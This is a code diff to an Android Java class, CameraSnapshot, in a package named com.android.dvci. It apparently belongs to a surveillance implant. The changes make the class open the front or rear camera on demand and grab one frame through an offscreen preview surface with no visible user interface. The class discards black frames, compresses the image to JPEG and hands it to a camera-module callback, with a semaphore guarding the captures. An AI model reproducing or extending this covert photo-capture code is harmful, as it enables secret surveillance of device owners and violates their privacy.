@@ -24,18 +24,15 @@ import android.graphics.YuvImage;
 import android.hardware.Camera;
 import android.opengl.GLES20;
 import android.os.Build;
-import android.os.Environment;
 import android.util.Log;
 
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.module.ModuleCamera;
 import com.android.dvci.util.Check;
-import com.android.dvci.util.Utils;
 
 import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.IOException;
 import java.io.OutputStream;
+import java.util.concurrent.Semaphore;
 
 //20131106: removed unnecessary glFinish(), removed hard-coded "/sdcard"
 //20131205: added alpha to EGLConfig
@@ -61,59 +58,41 @@ import java.io.OutputStream;
  * currently part of CTS.)
  */
 public class CameraSnapshot {
-	private static final String TAG = "CameraToMpegTest";
+	private static final String TAG = "CameraSnapshot";
 	private static final boolean VERBOSE = false;           // lots of logging
 
-	// where to put the output file (note: /sdcard requires WRITE_EXTERNAL_STORAGE permission)
-	private static final File OUTPUT_DIR = Environment.getExternalStorageDirectory();
-
-	// parameters for the encoder
-	private static final String MIME_TYPE = "video/avc";    // H.264 Advanced Video Coding
-	private static final int FRAME_RATE = 30;               // 30fps
-	private static final int IFRAME_INTERVAL = 5;           // 5 seconds between I-frames
-	private static final long DURATION_SEC = 8;             // 8 seconds of video
-
-	// Fragment shader that swaps color channels around.
-	private static final String SWAPPED_FRAGMENT_SHADER =
-			"#extension GL_OES_EGL_image_external : require\n" +
-					"precision mediump float;\n" +
-					"varying vec2 vTextureCoord;\n" +
-					"uniform samplerExternalOES sTexture;\n" +
-					"void main() {\n" +
-					"  gl_FragColor = texture2D(sTexture, vTextureCoord).gbra;\n" +
-					"}\n";
-
-	// encoder / muxer state
-
-	private int mTrackIndex;
-	private boolean mMuxerStarted;
+	private static Semaphore semaphore = new Semaphore(1);
 
 	// camera state
-	private Camera mCamera;
+	//private Camera mCamera;
 	private SurfaceTexture surface;
 	private Camera.PreviewCallback previewCallback = new Camera.PreviewCallback() {
 		@Override
 		public void onPreviewFrame(byte[] bytes, Camera camera) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
-
-				if(isBlack( bytes)) {
+			}
+			try {
+				if (isBlack(bytes)) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (onPreviewFrame),  BLACK");
 					}
 					return;
 				}
+
+				Camera.Parameters cameraParms = camera.getParameters();
 				Camera.Size size = cameraParms.getPreviewSize();
 				int format = cameraParms.getPreviewFormat();
-				if(format ==  ImageFormat.NV21 ) {
+				if (format == ImageFormat.NV21) {
 					ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
-					YuvImage image = new YuvImage(bytes,  ImageFormat.NV21, size.width, size.height, null);
+					YuvImage image = new YuvImage(bytes, ImageFormat.NV21, size.width, size.height, null);
 					image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
 							jpeg));
 					ModuleCamera.callback(jpeg.toByteArray());
 				}
+			}finally {
 
-				releaseCamera();
+				releaseCamera(camera);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onPreviewFrame), END");
 				}
@@ -130,8 +109,6 @@ public class CameraSnapshot {
 		return true;
 	}
 
-	private Camera.Parameters cameraParms;
-
 	/**
 	 * Wraps encodeCameraToMpeg().  This is necessary because SurfaceTexture will try to use
 	 * the looper in the current thread if one exists, and the CTS tests create one on the
@@ -143,16 +120,27 @@ public class CameraSnapshot {
 	 * Tests encoding of AVC video from Camera input.  The output is saved as an MP4 file.
 	 */
 	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
-	public synchronized void snapshot(int camera) {
+	public synchronized void snapshot(boolean face) {
 		// arbitrary but popular values
 		int encWidth = 640;
 		int encHeight = 480;
-		//int encBitRate = 6000000;      // Mbps
-		Log.d(TAG, MIME_TYPE + " output " + encWidth + "x" + encHeight);
 
 		try {
-			if (!prepareCamera(camera, encWidth, encHeight)) {
+			if(!semaphore.tryAcquire()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (snapshot), semaphore red");
+				}
 				return;
+			}
+
+			Camera mCamera = prepareCamera(face, encWidth, encHeight);
+			if (mCamera == null) {
+				semaphore.release();
+				return;
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (snapshot), face: " + face);
 			}
 
 			int[] surfaceparams = new int[1];
@@ -169,20 +157,51 @@ public class CameraSnapshot {
 			mCamera.setOneShotPreviewCallback(this.previewCallback);
 			mCamera.startPreview();
 
-			//Utils.sleep(300);
-			wait();
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (snapshot), END");
 			}
 
-		} catch (IOException e) {
-			e.printStackTrace();
-		} catch (InterruptedException e) {
-			e.printStackTrace();
-		} finally {
-			// release everything we grabbed
-			//releaseCamera();
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (snapshot) ERROR: " + e);
+			}
+			semaphore.release();
 		}
+	}
+
+	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
+	private Camera openCamera(boolean requestFace) {
+		int cameraCount = 0;
+		Camera cam = null;
+		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
+		cameraCount = Camera.getNumberOfCameras();
+		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
+			Camera.getCameraInfo(camIdx, cameraInfo);
+			boolean cameraFace = cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT;
+			if(cameraFace){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (openCamera), found FACE CAMERA");
+				}
+			}
+			if (requestFace == cameraFace) {
+
+				try {
+					cam = Camera.open(camIdx);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (openCamera), opened: " + camIdx);
+					}
+					if(cam!=null) {
+						return cam;
+					}
+				} catch (RuntimeException e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (openCamera), Error: " + e);
+					}
+				}
+			}
+		}
+
+		return cam;
 	}
 
 	/**
@@ -191,34 +210,17 @@ public class CameraSnapshot {
 	 * Opens a Camera and sets parameters.  Does not start preview.
 	 */
 	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
-	private boolean prepareCamera(int camera, int encWidth, int encHeight) {
+	private Camera prepareCamera(boolean face, int encWidth, int encHeight) {
 		try {
-			if (mCamera != null) {
-				throw new RuntimeException("camera already initialized");
-			}
 
 			Camera.CameraInfo info = new Camera.CameraInfo();
-
-			// Try to find a front-facing camera (e.g. for videoconferencing).
-			int numCameras = Camera.getNumberOfCameras();
-			if (camera < numCameras) {
-				mCamera = Camera.open(camera);
+			Camera mCamera = openCamera(face);
+			if(mCamera == null){
+				return null;
 			}
 
-			if (mCamera == null) {
-				Log.d(TAG, "No front-facing camera found; opening default");
-				mCamera = Camera.open();    // opens first back-facing camera
-			}
-
-			if (mCamera == null) {
-				return false;
-			}
-
-			cameraParms = mCamera.getParameters();
-
-			//cameraParms.setPreviewFormat(ImageFormat.JPEG);
+			Camera.Parameters cameraParms = mCamera.getParameters();
 			cameraParms.setPreviewFormat(ImageFormat.NV21);
-
 			cameraParms.set("iso", (String) "400");
 
 			choosePreviewSize(cameraParms, encWidth, encHeight);
@@ -226,14 +228,16 @@ public class CameraSnapshot {
 			mCamera.setParameters(cameraParms);
 
 			Camera.Size size = cameraParms.getPreviewSize();
-			Log.d(TAG, "Camera preview size is " + size.width + "x" + size.height);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (prepareCamera), Camera preview size is " + size.width + "x" + size.height);
+			}
 
-			return true;
+			return mCamera;
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (prepareCamera), ERROR " + ex);
 			}
-			return false;
+			return null;
 		}
 	}
 
@@ -270,17 +274,18 @@ public class CameraSnapshot {
 	/**
 	 * Stops camera preview, and releases the camera to the system.
 	 */
-	private synchronized void  releaseCamera() {
+	private synchronized void releaseCamera(Camera camera) {
 		if (VERBOSE) Log.d(TAG, "releasing camera");
-		if (mCamera != null) {
-			mCamera.stopPreview();
-			mCamera.release();
-			mCamera = null;
+
+		if (camera != null) {
+			camera.stopPreview();
+			camera.release();
 		}
-		notifyAll();
+
+		semaphore.release();
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (releaseCamera), END");
+			Check.log(TAG + " (releaseCamera), released");
 		}
 	}
 
